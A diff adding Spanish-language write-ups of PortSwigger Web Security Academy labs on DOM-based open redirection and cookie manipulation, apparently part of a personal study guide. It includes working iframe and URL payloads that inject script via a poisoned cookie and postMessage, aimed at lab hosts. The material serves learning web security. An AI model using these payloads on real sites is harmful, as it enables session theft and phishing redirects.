@@ -481,6 +481,34 @@ Para resolver el laboratorio se carga en el exploit server un `iframe`, donde el
 <iframe src=https://id-del-laboratorio.web-security-academy.net/ onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:alert(document.cookie)\"}","*")'>
 ```
 
+### [DOM-based open redirection](https://portswigger.net/web-security/dom-based/open-redirection/lab-dom-open-redirection)
+
+Al ingresar en un posteo del sitio vulnerable, al final de todo hay un link que debería redirigir a la home. En caso de que `returnUrl` tenga un valor *truthy*, se le asignará a `location.href` el valor en la posición 1. Si no, se le asignará `"/"`.
+
+```
+<a href="#" onclick="returnUrl = /url=(https?:\/\/.+)/.exec(location); if(returnUrl)location.href = returnUrl[1];else location.href = "/"">Back to Blog</a>
+```
+
+Para resolver el laboratorio, se debe armar una URL similar a la del posteo, pero que al final incluya otro query parameter `url`, cuyo valor sea la URL del exploit server del laboratorio.
+
+```
+https://id-del-laboratorio.web-security-academy.net/post?postId=4&url=https://id-del-exploit-server.web-security-academy.net/
+```
+
+### [DOM-based cookie manipulation](https://portswigger.net/web-security/dom-based/cookie-manipulation/lab-dom-cookie-manipulation)
+
+El sitio vulnerable usa una cookie llamada `lastViewedProduct`, cuyo valor es la URL del último producto visitado, y se utiliza en un link dentro de la tienda.
+
+Para resolver el laboratorio, se debe cargar un `iframe` en el exploit server, cuyo source original es igual a la URL de uno de los productos, a menos que se agregue un payload Javascript al final. Cuando el `iframe` carga por primera vez, el navegador abre temporalmente la URL maliciosa, que después se guarda como el valor de dicha cookie. El event handler de `onload` redirige inmediatamente a la home, pero mientras la cookie siga estando envenenada, se va a ejecutar la payload cada vez que se visite la home.
+
+```
+<iframe src="https://id-del-laboratorio.web-security-academy.net/product?productId=1&'><script>alert(document.cookie)</script>" onload="if(!window.x)this.src='https://id-del-laboratorio.web-security-academy.net';window.x=1;">
+```
+
+### []()
+
+### []()
+
 ---
 
 ## [Cross-origin resource sharing (CORS)](https://portswigger.net/web-security/cors)
